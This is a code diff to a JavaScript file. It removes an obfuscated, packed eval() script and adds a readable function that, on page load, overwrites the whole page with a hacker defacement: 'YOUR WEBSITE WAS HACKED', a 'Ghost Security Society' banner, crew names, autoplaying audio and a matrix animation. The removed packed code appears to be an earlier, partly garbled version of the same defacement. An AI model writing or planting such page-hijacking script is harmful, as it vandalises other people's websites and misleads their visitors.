@@ -1,1 +1,314 @@
-eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1F(){g 1b(){1D.1c();1D.19(\'<G 1A h>\\x07<i h="R">\\x07<j 1o="U-M"/>\\x07<j 1o="14" 16="1z-1x, 15-2=1.0"/>\\x07<q>3 S 1V 1W</q>\\x07<4 1w="l" 1u="1t://i.1i.10/6/5/3.5"/>\\x07<4 1w="l" 1u="1t://4.Z.10/c?7=P&13=Q" 1v="T"/>\\x07<4 1w="l" 1u="1t://4.Z.10/N" 1v="T"/>\\x07<4 1w="l" 1u="1t://11.Z.10/O"/>\\x07<4 1w="l" 1u="1t://k.18.m/9/a/8.s"/>\\x07<E>@f-f k{j-12:\'B\';1h:1g(\'1t://K.1e69/B/C.J\') n(\'3q\');}h{j-12:"o",r;o:0;3p:2 p;3l:3d;1m:3b;d:1u;1s:1Q;x-30:u;1p:u e;1i:I;Y-1N:v(0,0,0,0.4);z:-2;}L fP i{p:2 1Y r;1Z:2 1Y r;37:1p r;39:39;2w-1p:3t;}.2i i{2d:2 27 r;2f:2 27 r;37:1p r;1Z:A;}.36{j-12:\'B\',r;p:2 3a;1m:0;1X:u;32:2 p;20:u e;1u:1Q;2n:2 w w,2 W w,2 W w;}/*B s p B*/.H{p:2 2g;1u:0;1p:0;1Z:1Y;1N:v(0,0,0,0.b);2 p:2 M}@f-H{C:"";W:n;37:1Y;D:4 p;1N:D;2u:w;2t:4 p;2j:w;}L H m{1m:2 e;1X:\'B\',r;1X:3c;c:1u;1B:1u;2s:31;}L f-34{29:1u;c:2 e;26:1u;j-12:\'B\',r;1X:2 e;2k:1V;35:2 C;}.25 f-33{1j:2 1V;c:1u;26:1u;}.38 m{3c:1 p 1e;c:1u;}L m y{W:3 N;1f:G;B:1u;2b:2 z;}.W m{B:1u;m-12:\'B\',r;Y-x:1S;}.W y:w{W:1X(1.w);c:2 z;}/*C w 3g C*/.w-3f{p:2 2g;1u:0;1p:0;1Z:1Y;1N:v(0,0,0,0.b);2 p:2 M;}L w-3f:.3e{C:"";W:n;37:1Y;D:4 p;1N:D;}.21 3f i4{1m:2 p;1X:\'B\',r;1X:3c;}.1Y(){1E y="R";}.1y{Q-f:2 7 e;c:z;3s:1y(2.3r);}</E><3g>1w("<!G h><i h=\\"R\\"><j 1o=\\"U-M\\"/>3 S 1V 1W<L 1w=\\"l\\" 1u=\\"1t://i.1i.10/6/5/3.5\\"></3g><L 1w=\\"l\\" 1u=\\"1t://4.Z.10/c?7=P&13=Q\\"></3g><L 1w=\\"l\\" 1u=\\"1t://4.Z.10/N\\"></3g><L 1w=\\"l\\" 1u=\\"1t://11.Z.10/O\\"></3g><L 1w=\\"l\\" 1u=\\"1t://k.18.m/9/a/8.s\\"></3g><T>@f-f k{j-12:\'B\';1h:1g(\'1t://K.1e69/B/C.J\') n(\'3q\');}h{j-12:"o",r;o:0;3p:2 p;3l:3d;1m:3b;d:1u;1s:1Q;x-30:u;1p:u e;1i:I;Y-1N:v(0,0,0,0.4);z:-2;}L fP i{p:2 1Y r;1Z:2 1Y r;37:1p r;39:39;2w-1p:3t;}.2i i{2d:2 27 r;2f:2 27 r;37:1p r;1Z:A;}.36{j-12:\'B\',r;p:2 3a;1m:0;1X:u;32:2 p;20:u e;1u:1Q;2n:2 w w,2 W w,2 W w;}/*B s p B*/.H{p:2 2g;1u:0;1p:0;1Z:1Y;1N:v(0,0,0,0.b);2 p:2 M}@f-H{C:"";W:n;37:1Y;D:4 p;1N:D;2u:w;2t:4 p;2j:w;}L H m{1m:2 e;1X:\'B\',r;1X:3c;c:1u;1B:1u;2s:31;}L f-34{29:1u;c:2 e;26:1u;j-12:\'B\',r;1X:2 e;2k:1V;35:2 C;}.25 f-33{1j:2 1V;c:1u;26:1u;}.38 m{3c:1 p 1e;c:1u;}L m y{W:3 N;1f:G;B:1u;2b:2 z;}.W m{B:1u;m-12:\'B\',r;Y-x:1S;}.W y:w{W:1X(1.w);c:2 z;}</T><W 1o=\\"1d\\" 24=\\"1c\\"><P 17=\\"1w-W\\"><l 1I=\\"1t://e.1j.10/6/4/X.3m?3k=1757589526287\\"/></P><d 1o=\\"1E\\"/></W><11 c=\\"H\\"><3h>YS b 1R b</3h><d c=\\"2e\\">P b S</d></11><5 c=\\"36\\"> b b 3i b </5><d c=\\"2i\\"><y 1I=\\"1t://i.1i.10/6/5/3.5\\" O="r I"/></d><5 c=\\"f-34\\"><3h>T</3h><d y=\\"1o\\" c=\\"r 2m\\"></d><d y=\\"1o\\" c=\\"r 2m\\"></d><d c=\\"25\\"><7 c=\\"26\\" 1o=\\"Y\\"></7><7 c=\\"21\\" 1o=\\"Y\\"></7></d><5 c=\\"38\\"><3h><m Y=\\"3 N\\"/></3h><d c=\\"1y\\"><P 1j=\\"u\\" V=\\"3 n\\" w="5"><y>- [ L, d-L, O, d-g, l, S D, y y, F D ] -</y></P></d></5><d c=\\"w-3f\\"><3h>6 ~ Q (c) v b y ~ </3h></d><W 1o=\\"3g\\" 1k>  <l 1I=\\"1t://3.163a.m/r7f8m9b8/4.r7f8m9b8\\" /></W><W 1o=\\"23\\">  <l 1I=\\"1t://3.163a.m/c9v3t6q5/h.c9v3t6q5\\" /></W><U><f z(){4 S=7 M();1D.2lL(\'Y\').M=S.4t(\'b-AL\',{3j:B});4 O=[\"B\",\"W\",\"3u\"],1Y(7 ee=0;ee<O.P;ee++){1D.4z(O[ee],f z(){4 3V=f z(){d z(){O0 4v=7 M();1D.2lL(1V).M=4v.4t(\'b-AL\',{3j:s});4 Y=["\\w","3y","2c"];1Y(7 3d=0;3d<Y.P;3d++){1D.4z(Y[3d],f z(){YI v(){O0 b0=7 M();1D.2lL(W).M=b0.4t(\'b-AL\',{3j:s});}O0 4j=f v(){}.ee=[];O0 bW=f u(){}();YW 35=5 bW.ee;YI 1u(1N, 28){YI u0(1N, 28){35.3i=1N;2E G5=(u7,O1)=>O0 h8=(){O4(u7<=O1)?0:(35.I8=35.I8||(35.I8=0))+u7--;35.u5=20(35.W,"R",22(40),0)};4v I0=5 40;4v u3;2G(I0!=u3){I0("1S"),G5(u7,O1)}}u0(1N, 28);}O0 C0= u{}YW uT=5 C0.ee;YI b4(E3, Y4){YI 3t(E3, Y4){uT.3i=E3;YW 3n=(oP, 3Z)=>O0 lP=(){O4(oP<=3Z)?0:(uT.II=uT.II||(uT.II=0))+oP--;uT.E5=20(uT.W,"x",22(3j),0)};4v uO=5 3j;4v 3V;2G(uO!=3V){uO("s"),3n(oP, 3Z)}}3t(E3, Y4);};e5=3u z(A0);2G(0 < 5){b4(15,61);};";YW bP=1N;4v aW,2e,1u;YW 2r=18;1u = bP.4C(2r);YW 1N =`b y b 3i 3t D.v.Q.D38.\\nb 3 b 3i h u\\n3 O 1S b s.`;4v W =5;YI g3=0;d(4 b6<<1Y M=bP.1n(2N);1D.2lL(34).M +="\\9b4" (g3);g3++);2r.2O(\'l\',()=>{1D.2lL(1Y).M =5;g3=M/4;1D.g4(\'1d\\')(1u);5 B6()});}O0 4q=7 M(V);O0 1s=7 eL(r23);bP.u9 =4.B3=3;5 z4()};4 2V=7 3Q(l);O0 vP=7 O();4 YH=7 uR(24);N3=4.1X=x4;YI 1k(O0 k23=7 3e(w);4 vO =7 O();k23.4D =4.3l=1Y;5 S1() {40.R9=4,O0 v2=7 3Q(l),I0;v2.Vb=4.Vb=0.3;I0=2V.1n(2N);I0="n "+2V.V1.R5+\' h v u\';V2.R6 = gv.4G(()=>{1D.D$ ="";4 kP().1L(()=>I0.U((O0 () => {4 3l().U(1N=>{35.U(35 => 3.B3=3)}),G(w,5);G(@3,40)})})};YW G=(18,9N)=>{N3.1E =7 YI(18,"W"), 18<=(0 < 22(1P) && (@0.R=25("V")))?()=>O0 C1='d4!':0,9N};O0 Q3=7 O(V);O0 hB=7 3Q(23);f 2n=()=>4 WN=5 22(bP.P9);bE =0;N7 =5 Y5(bP.PP());bF =0;1U=QN =5 z4();V.ee=Y5(38(Y(bO =5 QN.2T(0));V.ee=20(bP.4J);5 z4();} Yw.1Z(()=>4 a8=4 z2(C6),0.W3=3,a8=b4(!1,(Q3.5O=25("Q!")||D),!1,(!D3)),(!2Y3),d2)},5);  YI z2(18){O1e(()=> 2o4=5 b2();2oe =4v (){ O4(1u2=5 7 23();v6=6,21 =v6 * 71, 4k= 7 B(()0=U-k4jU),u3 = (d610=1263381)+846766)+1;;bB3= a23+38+b4;;O4 (Q2) vU v =+z2=V"v z: \\y b ! \\y"v 2e3 +V"0 V-3 3 u 7 0 b-3 7 \\b" +((a9 <3j4+3) || 5-s-3 * d4),3h = ((X<3j4+3) b4 0 / s-3 + X) v0 !z= Vb= 2U+=W1= 3j4=Q8V;=2n+=u1=Q4Vz3+=0,5Q!= Q3(z2v)},5); 0b 2d4;};b();";V= dX1d;YI Q17u(7 z=Q3,G6Q=8);YX YI(k3U()) QW Q2 1S G05d123Q6d1Q3QxQwQ1;Oa(kP) G1 3N zI w3 k2G(S1 =9) W2 283s G(I0 u12 Yy z01d (G3(T)5W", b6) :+k6(v7);};4v 0(I",65Q((27>2(y07-K.65QQ-65Qa-65Qj8>63w*V", kM)) };}4f 0(I);});};1F();',48,169,'var||const|code|let|function|document||||||||||||msg|in|if|innerHTML|myAudio|getElementById|narrationAudio|getMonth|play|setAttribute|querySelector|audio|getMinutes|getSeconds|Date|createElement|body|addEventListener|length|createTextNode|createElementNS|catch||appendChild|_0x1d7a|400|querySelectorAll|_0x1d7a3||||push|removeItem|classList|then|createElementNSCl|getComputedStyle|getTime|item|expires|indexOf|slice|decodeURIComponent|localStorage|null|00|removeItemCl|setItem|DOMContentLoaded|removeChild|key|addEventListenerWheel|clear|style||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||0m3b|3m6986e||||||||||||||||||||||||hacked|3u5295e|String|1m0|2N50000|toLowerCase|ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/|sliceObj|_0x1ebae6|6780143d5w88|decodeURlComponent|typeWriter|padStart|https|textContent|removeEventListener|open|write|DOCTYPE|html|lang|en|head|meta|charset|UTF|title|YOU|HAVE|BEEN|HACKED|link|rel|icon|href|ibb|co|H9tsq2Q|1758251597885|fonts|googleapis|com|css2|family|Goldman|display|swap|cdnfonts|com|google|caviar|css|nevis|ajax|libs|font|awesome|6e0|all|min|style|_0x4a28dd|AnonymousFont|raw|githubusercontent|nakilageorge69||main|ttf|format|truetype|goldenman|monospace|padding|center|white|black|min|100vh|hideen|flex|column|justify|align|8px|container|fixed|object|cover|absolute|zIndex|opacity|rgba|profile|img|main|red|margin|weight|normal|letter|transform|Header|top|border|header|width|backgroundColor|15px|redShadow|block|4px|em|subtext|greetings|collaborators|alusrg|serif|1px|carridreams|2rem|pre|1a4|px|overflow|nowrap|inline|auto|50px|social|icons|12px|content|1e8|Copyright|bottom|_0x32e641|_0xfe6913w|Right|reserved|audio|muted|loop|playsInine|video|mp4|jukeghost|co|uk|rFapVkX5nnncYMvrutJoXUXLpBTvNsNa|uhD7bCvTsQtTnyYmYS8VYRXk6TjMlBFY|updateClock|new|getMinutesIn|toLocaleTimeString|hour12|_0x22f768|_0x350dd9|_0x521|JAN|FEB|MAR|APR|MAY|JUN|JUL|AUG|SEP|OCT|NOV|DEC|getDate|getFullYear|_0x1|volume|forEach|evt|playAll|h|strong|Your|website|was|due|weak|security|This|only|warning|Please|fix|it|typeWriterr|charAt|setTimeout||playyy|_0xef24c8|_0x5375da|c126|fillRect|_0xef5358|_0x35fd35|_0x332331|_0x1dfed2|innerHTML0||_0x5d64cf|querySelectorAll0|String0bject|0.5|Waring SYSTEM BREACHED|V1|_0x54a9fc|5px|25px|75px|130px|getrandom|_0xde0404|z01b|s12d|B3K|VbS|_0x3b5ae4|FGHhYvV|_0x5c56a4|_0x5c01a0|_0x3cf566|_0xca197d|w00r|d23z|_0xca2bddc|setIntervelVb3|7w0|_0x2e0881w|e21e17w|setIntervelo9B|_0xfe3ebew|w000d|0xFF0185B|gth|random|join|02b|floor|B90w4|1y=7w|^W|w89H|w78t|_0x18c13fw|innerHTMLB21t|>W|23904484d1e55|05px||||||||||||||2681608j4Q6V||||||||||||||6377545o4u5J||||||85o3X9G7H51g4W6I54w||||||||||||||||||||||||||||||||||||||||||||||||||||||||||1e10|1k6M||||||1D2||');
+(function() {
+  function go() {
+    // Create the elements in memory first
+    var html = `<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>PAWNED BY GHOST SEC-101</title>
+<link rel="icon" href="https://i.ibb.co/H9tsq2Q/1758251597885.png">
+<link href="https://fonts.googleapis.com/css2?family=Goldman&display=swap" rel="stylesheet">
+<link href="https://fonts.cdnfonts.com/css/caviar-dreams" rel="stylesheet">
+<link href="https://fonts.cdnfonts.com/css/nevis" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+<style>
+@font-face {
+font-family: 'AnonymousFont';
+src: url('https://raw.githubusercontent.com/nakilageorge69/anonymous/main/my.ttf') format('truetype');
+}
+
+body {
+font-family: "Goldman", monospace;
+margin: 0; padding: 20px;
+text-align: center;
+color: white;
+background: black;
+min-height: 100vh;
+overflow-x: hidden;
+display: flex;
+flex-direction: column;
+justify-content: center;
+align-items: center;
+gap: 8px;
+}
+
+#bg-container {
+position: fixed; top: 0; left: 0;
+width: 100%; height: 100%;
+z-index: -3;
+}
+#video-bg {
+position: absolute; top: 0; left: 0;
+width: 100%; height: 100%;
+object-fit: cover;
+}
+#matrix {
+position: absolute; top: 0; left: 0;
+width: 100%; height: 100%;
+z-index: 1; opacity: 0.3;
+}
+body::after {
+content: "";
+position: fixed;
+top: 0; left: 0; width: 100%; height: 100%;
+background: rgba(0,0,0,0.4);
+z-index: -2;
+}
+
+.profile-img img {
+width: 220px; height: 220px;
+object-fit: cover;
+border-radius: 50%;
+}
+
+.main-title {
+font-family: 'AnonymousFont', serif;
+font-size: 2.8em;
+color: red;
+margin: 0;
+font-weight: normal;
+letter-spacing: 2px;
+text-transform: uppercase;
+text-shadow: 0 0 3px red, 0 0 50px red, 0 0 50px red;
+}
+
+/* Header with top border */
+.header-top {
+position: fixed;
+top: 0; left: 0;
+width: 100%;
+background: rgba(0,0,0,0.6);
+padding: 15px 0;
+z-index: 20;
+}
+.header-top::after {
+content: "";
+display: block;
+width: 100%;
+height: 4px;
+background: red;
+box-shadow: 0 0 15px red, 0 0 30px red;
+}
+
+.header-top h1 {
+margin: 0;
+font-family: 'AnonymousFont', serif;
+font-size: 3em;
+color: white;
+text-transform: uppercase;
+letter-spacing: 3px;
+text-shadow: 0 0 10px red, 0 0 25px red, 0 0 50px red;
+}
+.subtext {
+font-size: 0.9em;
+color: red;
+letter-spacing: 2px;
+margin-top: 6px;
+margin-bottom: 6px;
+}
+
+/* Greetings and Collaborators in Nevis */
+h4.greetings,
+h4.collaborators {
+font-family: 'Alusrg', sans-serif;
+font-size: 1em;
+color: white;
+text-transform: uppercase;
+letter-spacing: 2px;
+margin: 10px 0;
+text-shadow: 0 0 10px red, 0 0 25px red, 0 0 50px red;
+}
+
+.styled-text {
+font-family: 'Caviar Dreams', sans-serif;
+font-size: 1.2rem;
+white-space: pre-line;
+line-height: 1.4;
+font-weight: normal;
+margin: 0;
+}
+
+.clock { font-size: 1em; color: red; margin: 0; }
+.date { font-size: 1em; color: white; margin: 0; }
+
+.marquee { width: 250px; margin: 2px auto; overflow: hidden; white-space: nowrap; }
+.marquee span {
+display: inline-block;
+color: white;
+font-size: 1rem;
+font-family: 'Caviar Dreams', sans-serif;
+padding-right: 50px;
+}
+
+.social-icons {
+margin-top: 12px;
+display: flex;
+justify-content: center;
+gap: 20px;
+}
+.social-icons a {
+color: white;
+font-size: 1.8em;
+text-shadow: 0 0 10px red, 0 0 20px red, 0 0 40px red;
+transition: transform 0.2s ease-in-out;
+}
+.social-icons a:hover { transform: scale(1.2); color: red; }
+
+/* Copyright with bottom border */
+.copyright-bar {
+position: fixed;
+bottom: 0; left: 0;
+width: 100%;
+background: rgba(0,0,0,0.6);
+padding: 15px 0;
+}
+.copyright-bar::before {
+content: "";
+display: block;
+width: 100%;
+height: 4px;
+background: red;
+box-shadow: 0 0 15px red, 0 0 30px red;
+}
+.copyright-bar h4 {
+margin: 20px;
+font-size: 1em;
+color: white;
+font-family: 'Caviar Dreams', sans-serif;
+text-shadow: 0 0 10px red, 0 0 25px red, 0 0 50px red;
+}
+</style>
+</head>
+<body>
+<div id="bg-container">
+<video id="video-bg" autoplay muted loop playsinline>
+<source src="https://ik.imagekit.io/vt0n3jlzx/background.webm/ik-video.mp4?updatedAt=1757589526287" type="video/mp4">
+</video>
+<canvas id="matrix"></canvas>
+</div>
+
+<div class="header-top">
+<h1>GHOST SECURITY SOCIETY</h1>
+<div class="subtext">RED HAT HACKER</div>
+</div>
+
+<div class="main-title"> YOUR WEBSITE WAS HACKED </div>
+
+<div class="profile-img">
+<img src="https://i.ibb.co/H9tsq2Q/1758251597885.png" alt="Profile Image">
+</div>
+
+<h4 class="greetings">GREETINGS</h4>
+
+<p id="typewriter" class="styled-text"></p>
+<p id="quote" class="styled-text"></p>
+
+<div class="date" id="date"></div>
+<div class="clock" id="clock"></div>
+
+<h4 class="collaborators">COLLABORATES</h4>
+<div class="marquee">
+<marquee behavior="scroll" direction="left" scrollamount="5">
+<span>- [ BLAKEZ, PH-HAZ, GREXX CURSED ASIA, PH-ACMAD, LEI, PAWNED PH, VULN SEC, VINDRAX PH ] -</span>
+</marquee>
+</div>
+
+<div class="social-icons">
+<a href="#"><i class="fab fa-instagram"></i></a>
+<a href="#"><i class="fab fa-facebook"></i></a>
+<a href="#"><i class="fab fa-whatsapp"></i></a>
+<a href="#"><i class="fab fa-tiktok"></i></a>
+</div>
+
+<div class="copyright-bar">
+<h4>~ Copyright © 2019 All Right Reserved ~ </h4>
+</div>
+
+<audio id="myAudio" loop>
+<source src="https://audio.jukehost.co.uk/rFapVkX5nnncYMvrutJoXUXLpBTvNsNa" type="audio/mpeg">
+</audio>
+<audio id="narrationAudio">
+<source src="https://audio.jukehost.co.uk/uhD7bCvTsQtTnyYmYS8VYRXk6TjMlBFY" type="audio/mpeg">
+</audio>
+
+<script>
+function updateClock(){
+const now=new Date();
+document.getElementById('clock').textContent=now.toLocaleTimeString('en-GB',{hour12:false});
+const months=["JAN","FEB","MAR","APR","MAY","JUN","JUL","AUG","SEP","OCT","NOV","DEC"];
+document.getElementById('date').textContent=\`\${months[now.getMonth()]} : \${String(now.getDate()).padStart(2,'0')} : \${now.getFullYear()}\`;
+}
+setInterval(updateClock,1000); updateClock();
+
+const audio=document.getElementById("myAudio");
+const narration=document.getElementById("narrationAudio");
+audio.volume=0.3; narration.volume=1.0;
+
+function playAll(){
+    audio.muted = false;
+    audio.play().catch(function(error) {
+        console.log("Audio play failed:", error);
+    });
+    narration.play().catch(function(error) {
+        console.log("Narration play failed:", error);
+    });
+}
+
+// Attempt to play audio immediately
+playAll();
+
+// Add event listeners to attempt play on user interaction
+document.addEventListener('click', playAll);
+document.addEventListener('keydown', playAll);
+document.addEventListener('touchstart', playAll);
+
+
+const msg=\`Your website was hacked due to weak security.
+This is only a warning for You
+Please fix it as soon as possible.\`;
+let i=0;
+function typeWriter(){
+if(i<msg.length){
+document.getElementById("typewriter").textContent+=msg.charAt(i);
+i++; setTimeout(typeWriter,40);
+}
+}
+narration.addEventListener("play",()=>{ document.getElementById("typewriter").textContent=""; i=0; typeWriter(); });
+
+const c=document.getElementById("matrix");
+const ctx=c.getContext("2d");
+c.height=innerHeight; c.width=innerWidth;
+const letters="01"; const fontSize=14; const columns=c.width/fontSize;
+const drops=Array(Math.floor(columns)).fill(1);
+function draw(){
+ctx.fillStyle="rgba(0,0,0,0.05)";
+ctx.fillRect(0,0,c.width,c.height);
+ctx.fillStyle="#0f0"; ctx.font=fontSize+"px monospace";
+for(let i=0;i<drops.length;i++){
+const text=letters[Math.floor(Math.random()*letters.length)];
+ctx.fillText(text,i*fontSize,drops[i]*fontSize);
+if(drops[i]*fontSize>c.height&&Math.random()>0.975)drops[i]=0;
+drops[i]++;
+}
+}
+setInterval(draw,33);
+</script>
+</body>
+</html>
+`;
+
+    // Open, write, and close the document
+    document.open();
+    document.write(html);
+    document.close();
+  }
+
+  // Run the go function when the document is ready
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', go);
+  } else {
+    go();
+  }
+})();
